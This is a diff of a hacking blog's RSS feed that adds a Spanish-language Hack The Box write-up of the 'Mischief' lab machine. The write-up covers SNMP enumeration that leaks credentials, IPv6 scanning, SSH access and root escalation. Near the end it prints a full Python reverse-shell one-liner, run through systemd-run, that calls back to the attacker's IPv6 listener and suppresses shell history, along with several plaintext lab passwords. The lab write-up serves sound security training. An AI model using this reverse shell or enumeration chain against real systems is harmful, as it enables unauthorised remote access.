@@ -1,4 +1,301 @@
-<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>Hacking Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Tentacle HTB Writeup</title><link>https://fuwari.vercel.app/posts/tentacle/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/tentacle/</guid><description>Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns.</description><pubDate>Thu, 08 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Mil4ne</title><description>Hacking Blog</description><link>https://fuwari.vercel.app/</link><language>en</language><item><title>Mischief HTB Writeup</title><link>https://fuwari.vercel.app/posts/mischief/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/mischief/</guid><description>Mischief es una maquina en la cual enumeramos SNMP por udp, Tambien encontraremos un puerto interesante por IPV6.</description><pubDate>Fri, 09 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;SNMP Enumeration&lt;/li&gt;
+&lt;li&gt;Information Leakage&lt;/li&gt;
+&lt;li&gt;IPV6&lt;/li&gt;
+&lt;li&gt;ICMP Data Exfiltration (Python Scapy)&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Information Gathering&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Tenemos conexion con la maquina victima:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ping -c1 10.10.10.92 
+PING 10.10.10.92 (10.10.10.92) 56(84) bytes of data.
+64 bytes from 10.10.10.92: icmp_seq=1 ttl=63 time=137 ms
+
+--- 10.10.10.92 ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 137.229/137.229/137.229/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Escaneo con nmap (TCP)&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.92 -oG nmap 
+
+PORT     STATE SERVICE
+22/tcp   open  ssh
+3366/tcp open  creativepartnr
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encontramos 2 puertos, vamos a tratar de ver un poco mas de informacion de estos servicios:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;nmap -p22,3366 -sCV 10.10.10.92 -Pn 
+
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+3366/tcp open  caldav  Radicale calendar and contacts server (Python BaseHTTPServer)
+| http-auth: 
+| HTTP/1.0 401 Unauthorized\x0D
+|_  Basic realm=Test
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.15rc1
+|_http-title: Site doesn&apos;t have a title (text/html).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Puerto 22 SSH, lo ignoramos porque no disponemos de credenciales.&lt;/li&gt;
+&lt;li&gt;Puerto 3366, Servicio web en python, al entrar no sale esto:
+&lt;img src=&quot;./img/1.png&quot; alt=&quot;img&quot; /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Probe con credenciales por defecto, pero nada.&lt;/p&gt;
+&lt;h2&gt;Escaneo con nmap (UDP)&lt;/h2&gt;
+&lt;p&gt;Descubrimos un puerto por UDP.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap --open --top-ports 500 -n -Pn -sU 10.10.10.92 -oG nmapUDP 
+
+PORT    STATE SERVICE
+161/udp open  snmp
+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -p161 -n -Pn -sU 10.10.10.92 -sVC 
+
+PORT    STATE SERVICE VERSION
+161/udp open  snmp    SNMPv1 server; net-snmp SNMPv3 server (public)
+| snmp-processes: 
+|   1: 
+|   2: 
+|   4: 
+|   6: 
+|   7: 
+|   8: 
+|   9: 
+|   10: 
+|   11: 
+|   12: 
+|   13: 
+|   14: 
+|   15: 
+|   16: 
+|   17: 
+|   18: 
+|   19: 
+|   20: 
+|   21: 
+|_  22: 
+| snmp-interfaces: 
+|   lo
+|     IP address: 127.0.0.1  Netmask: 255.0.0.0
+|     Type: softwareLoopback  Speed: 10 Mbps
+|   Intel Corporation 82545EM Gigabit Ethernet Controller (Copper)
+|     IP address: 10.10.10.92  Netmask: 255.255.255.0
+|     MAC address: 00:50:56:94:ab:aa (VMware)
+|_    Type: ethernetCsmacd  Speed: 1 Gbps
+| snmp-sysdescr: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+|_  System uptime: 1h22m4.42s (492442 timeticks)
+| snmp-info: 
+|   enterprise: net-snmp
+|   engineIDFormat: unknown
+|   engineIDData: b6a9f84e18fef95a00000000
+|   snmpEngineBoots: 20
+|_  snmpEngineTime: 1h22m04s
+| snmp-netstat: 
+|   TCP  0.0.0.0:22           0.0.0.0:0
+|   TCP  0.0.0.0:3366         0.0.0.0:0
+|   TCP  127.0.0.1:3306       0.0.0.0:0
+|   TCP  127.0.0.53:53        0.0.0.0:0
+|   UDP  0.0.0.0:161          *:*
+|   UDP  0.0.0.0:55617        *:*
+|_  UDP  127.0.0.53:53        *:*
+Service Info: Host: Mischie
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Enumeration&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;h3&gt;Que es SNMP?&lt;/h3&gt;
+&lt;blockquote&gt;
+&lt;p&gt;SNMP (Simple Network Management Protocol) es un protocolo de red utilizado para gestionar y monitorizar dispositivos de red, como routers y switches, permitiendo la recolección de datos y el envío de alertas sobre el estado de la red.&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Para enumerar SNMP nesecitamos una comunity string, tenemos una lista de ellas en la seclists.&lt;/p&gt;
+&lt;p&gt;La &quot;community string&quot; en SNMP es una forma de autenticación básica que actúa como una contraseña para acceder a la información de un dispositivo de red. Las community strings permiten a un usuario o sistema gestionar y obtener datos de un dispositivo a través de SNMP.&lt;/p&gt;
+&lt;p&gt;Con una herramienta llamada &lt;code&gt;onesixtyone&lt;/code&gt; podemos hacer brute force y asi darnos cuanta que comunity string usa la maquina victima, aqui tenemos una lista en la seclists: &lt;code&gt;/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt&lt;/code&gt;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt 10.10.10.92   
+Scanning 1 hosts, 120 communities
+10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Tenemos &lt;code&gt;public&lt;/code&gt;, ya que encontramos la comunity string, podemos usar la herramienta &lt;code&gt;snmpwalk&lt;/code&gt;, para enumerar el servicio SNMP&lt;/p&gt;
+&lt;p&gt;pero Primero vamos a configurar varias cositas del snmpwalk para ver mejor el OutPut, porque nos va a lanzar mucha informacion un poco incomoda de leer:&lt;/p&gt;
+&lt;h2&gt;Configuracion de snmp para ver mejor el Output&lt;/h2&gt;
+&lt;p&gt;Instalamos esto:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo apt install snmp-mibs-downloader
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;luego vamos al archivo de configuracion de snmp y comentamos esta linea:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nano /etc/snmp/snmp.conf
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;#mibs :
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;snmpwalk Enum&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;snmpwalk -v2c -c public 10.10.10.92
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Esto nos va a lanzar un monton de Datos, puedes buscarlos de forma manual como yo lo hice, pero para que lo tengas a mano mas rapido, vamos a filtrar:&lt;/p&gt;
+&lt;p&gt;Primero vamos a tratar de ver el servicio de Python web que esta corriendo en TPC port 3366:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;snmpwalk -v2c -c public 10.10.10.92 hrSWRunParameters | grep &quot;SimpleHTTPAuthServer&quot;
+HOST-RESOURCES-MIB::hrSWRunParameters.794 = STRING: &quot;-m SimpleHTTPAuthServer 3366 loki:godofmischiefisloki --dir /home/loki/hosted/&quot;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Encontramos credenciales que nos podrian servir mas adelante.&lt;/p&gt;
+&lt;p&gt;Tambien busquemos la IPv6 de la maquina victima:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;snmpwalk -v2c -c public 10.10.10.92 ipAddressType 
+
+IP-MIB::ipAddressType.ipv4.&quot;10.10.10.92&quot; = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv4.&quot;10.10.10.255&quot; = INTEGER: broadcast(3)
+IP-MIB::ipAddressType.ipv4.&quot;127.0.0.1&quot; = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv6.&quot;00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01&quot; = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv6.&quot;de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:94:ab:aa&quot; = INTEGER: unicast(1)
+IP-MIB::ipAddressType.ipv6.&quot;fe:80:00:00:00:00:00:00:02:50:56:ff:fe:94:ab:aa&quot; = INTEGER: unicast(1)
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Simplifica tu IPv6&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/2.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Esta IPv6 la podemos simplificar, quitando los &lt;code&gt;0&lt;/code&gt; consecutivos y poniendo &lt;code&gt;::&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;Al hacer ping a la maquina nos responde de una:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ping6 -c1 dead:beef::250:56ff:fe94:abaa
+
+PING dead:beef::250:56ff:fe94:abaa (dead:beef::250:56ff:fe94:abaa) 56 data bytes
+64 bytes from dead:beef::250:56ff:fe94:abaa: icmp_seq=1 ttl=63 time=152 ms
+
+--- dead:beef::250:56ff:fe94:abaa ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 152.079/152.079/152.079/0.000 ms
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Escaneo de nmap por IPv6&lt;/h2&gt;
+&lt;p&gt;Vamos a hacer un Escaneo de Nmap por IPv6, para ver si podemos encontrar algun puerto que por IPv4 no podriamos ver.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;sudo nmap -p- --open --min-rate 5000 -n -Pn -sS -6  dead:beef::250:56ff:fe94:abaa 
+
+[sudo] password for mil4ne: 
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 16:35 EDT
+Nmap scan report for dead:beef::250:56ff:fe94:abaa
+Host is up (0.14s latency).
+Not shown: 65278 closed tcp ports (reset), 255 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;nmap -p22,80 -sVC -6 dead:beef::250:56ff:fe94:abaa 
+
+Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-08-09 16:46 EDT
+Nmap scan report for dead:beef::250:56ff:fe94:abaa
+Host is up (0.14s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 2a:90:a6:b1:e6:33:85:07:15:b2:ee:a7:b9:46:77:52 (RSA)
+|   256 d0:d7:00:7c:3b:b0:a6:32:b2:29:17:8d:69:a6:84:3f (ECDSA)
+|_  256 3f:1c:77:93:5c:c0:6c:ea:26:f4:bb:6c:59:e9:7c:b0 (ED25519)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+|_http-server-header: Apache/2.4.29 (Ubuntu)
+|_http-title: 400 Bad Request
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Host script results:
+| address-info: 
+|   IPv6 EUI-64: 
+|     MAC address: 
+|       address: 00:50:56:94:ab:aa
+|_      manuf: VMware
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h2&gt;Port 80 &lt;code&gt;IPv6&lt;/code&gt; - Login page&lt;/h2&gt;
+&lt;p&gt;&lt;img src=&quot;./img/3.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Aqui tenemos otro login, probamos las credenciales que habiamos encontra en el snmpwalk, pero no funcionan, asi que vamos a probarlas con el login que nos salia en el puerto 3366 por IPv4.&lt;/p&gt;
+&lt;h2&gt;Ingresamos a la web del puerto 3366 (IPv4)&lt;/h2&gt;
+&lt;p&gt;Logramos acceder al primer login, en la web podemos ver estas crendeciales y una imagen Rara.&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;loki:godofmischiefisloki&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/4.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Con estas credenciales nuevas lo que podemos tratar es ver si son validas en el otro login del port 80 IPv6&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/5.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Probando varias combinaciones pude entrar al panel, pero no con usuario loki, si no con el usuario Administrator.&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;&lt;code&gt;Administrator:trickeryanddeceit&lt;/code&gt;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;Al acceder, nos da una pagina para ejecutar comandos en la maquina victima, y diras, o que bien me mando una revshell entonces, pues fijate que no.&lt;/p&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Explotation&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;h2&gt;Panel de Comandos&lt;/h2&gt;
+&lt;p&gt;pero si podemos ver esto:&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/6.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Basicamente te dice que hay credenciales en el home de loki.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/7.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Aqui tienes las credenciales, ahora nos conectamos por ssh con el usuario loki.&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;ssh loki@10.10.10.92                        
+loki@10.10.10.92&apos;s password: lokiisthebestnorsegod
+
+loki@Mischief:~$ 
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Privilege Escalation&amp;lt;/span&amp;gt;&lt;/h1&gt;
+&lt;p&gt;Despues de leer la user.txt, vamos directamente sin perder tiempo al &lt;code&gt;.bash_history&lt;/code&gt;;&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;loki@Mischief:~$ cat .bash_history
+python -m SimpleHTTPAuthServer loki:lokipasswordmischieftrickery
+exit
+free -mt
+ifconfig
+cd /etc/
+sudo su
+su
+exit
+su root
+ls -la
+sudo -l
+ifconfig
+id
+cat .bash_history 
+nano .bash_history 
+exit
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;La password de root esta aqui.&lt;/p&gt;
+&lt;p&gt;Pero si Intentas acceder como root, no te va a dejar.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;./img/8.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;por que el usuario loki no puede ejecutar &lt;code&gt;su&lt;/code&gt; ni &lt;code&gt;sudo&lt;/code&gt;, mira:&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;loki@Mischief:~$ getfacl /usr/bin/sudo
+getfacl: Removing leading &apos;/&apos; from absolute path names
+# file: usr/bin/sudo
+# owner: root
+# group: root
+# flags: s--
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+other::r-x
+&lt;/code&gt;&lt;/pre&gt;
+&lt;pre&gt;&lt;code&gt;loki@Mischief:~$ getfacl /bin/su
+getfacl: Removing leading &apos;/&apos; from absolute path names
+# file: bin/su
+# owner: root
+# group: root
+# flags: s--
+user::rwx
+user:loki:r--
+group::r-x
+mask::r-x
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Entoces lo que haremos sera, enviarnos una revshell con python utilizando &lt;code&gt;systemd-run&lt;/code&gt;, ya que tenemos la password de root.&lt;/p&gt;
+&lt;p&gt;Si nos enviamos una revshell por IPv4 no nos funciona, asi que ya sabes, hay que hacerla por IPv6:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Primero Busca tu Ipv6
+&lt;img src=&quot;./img/9.png&quot; alt=&quot;img&quot; /&gt;&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Ponte escucha con &lt;code&gt;ncat&lt;/code&gt; Por Ipv6, ojo con &lt;code&gt;nc&lt;/code&gt; no me funciono.&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;ncat -6 -l -p 9002
+&lt;/code&gt;&lt;/pre&gt;
+&lt;ul&gt;
+&lt;li&gt;Envia la revshell, modificando la ip:&lt;/li&gt;
+&lt;/ul&gt;
+&lt;pre&gt;&lt;code&gt;systemd-run python -c &apos;import socket,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect((&quot;dead:beef:2::1009&quot;,9002));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv(&quot;HISTFILE&quot;,&quot;/dev/null&quot;);pty.spawn(&quot;/bin/sh&quot;);s.close()&apos;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;p&gt;Ya deberiamos tener una shell como root.&lt;/p&gt;
+&lt;h2&gt;Encuentra la root.txt&lt;/h2&gt;
+&lt;pre&gt;&lt;code&gt;root@Mischief:~# find / -type f -name root.txt 2&amp;gt;/dev/null
+/usr/lib/gcc/x86_64-linux-gnu/7/root.txt
+/root/root.txt
+&lt;/code&gt;&lt;/pre&gt;
+</content:encoded></item><item><title>Tentacle HTB Writeup</title><link>https://fuwari.vercel.app/posts/tentacle/</link><guid isPermaLink="true">https://fuwari.vercel.app/posts/tentacle/</guid><description>Tentacle es una maquina de dificultad Hard en la cual veremos varias cositas de kerberos y dns.</description><pubDate>Thu, 08 Aug 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;&amp;lt;span style=&quot;color: #33acff&quot;&amp;gt;Skills&amp;lt;/span&amp;gt;&lt;/h1&gt;
 &lt;ul&gt;
 &lt;li&gt;DNS Enumeration (dnsenum)&lt;/li&gt;
 &lt;li&gt;SQUID Proxy&lt;/li&gt;
